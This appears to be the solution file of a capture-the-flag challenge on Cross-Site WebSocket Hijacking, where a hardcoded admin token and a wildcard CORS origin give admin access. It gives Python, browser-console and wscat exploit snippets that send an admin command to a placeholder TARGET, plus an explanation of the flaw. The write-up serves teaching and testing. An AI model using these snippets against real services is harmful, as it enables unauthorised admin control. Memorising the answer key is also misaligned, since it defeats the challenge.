# WebSocket Hijacking - Solution

## Vulnerability: Cross-Site WebSocket Hijacking (CSWSH)

The server uses `cors_allowed_origins='*'` with no Origin validation on WebSocket connections.
The admin token `admin-static-token-abc123` is visible in the JavaScript source of `/chat`.

## Exploit

### Method 1: Python script (direct)
```python
import socketio
import time

sio = socketio.Client()

@sio.on('command_result')
def on_result(data):
    print(f"FLAG: {data['output']}")

@sio.on('connect')
def on_connect():
    print("Connected as admin!")
    sio.emit('admin_command', {'command': 'flag'})

sio.connect('http://TARGET:8080', auth={'token': 'admin-static-token-abc123'})
time.sleep(3)
sio.disconnect()
```

### Method 2: Browser console on /chat page
Open browser DevTools console on any page of the site:
```javascript
const s = io('http://TARGET:8080', {auth: {token: 'admin-static-token-abc123'}});
s.on('command_result', d => alert('FLAG: ' + d.output));
s.on('connect', () => s.emit('admin_command', {command: 'flag'}));
```

### Method 3: curl/wscat
```bash
# Install wscat: npm install -g wscat
wscat -c "ws://TARGET:8080/socket.io/?EIO=4&transport=websocket"
# Then negotiate and send: 42["admin_command",{"command":"flag"}]
```

## Why it works
1. The admin token is hardcoded in the JS source (`// Debug: admin_token = 'admin-static-token-abc123'`)
2. The SocketIO server accepts connections from ANY origin (`cors_allowed_origins='*'`)
3. No additional authentication or CSRF protection on the WebSocket handshake
4. Connecting with `auth={'token': 'admin-static-token-abc123'}` grants admin role
5. The `admin_command` event with `command: 'flag'` returns the flag directly
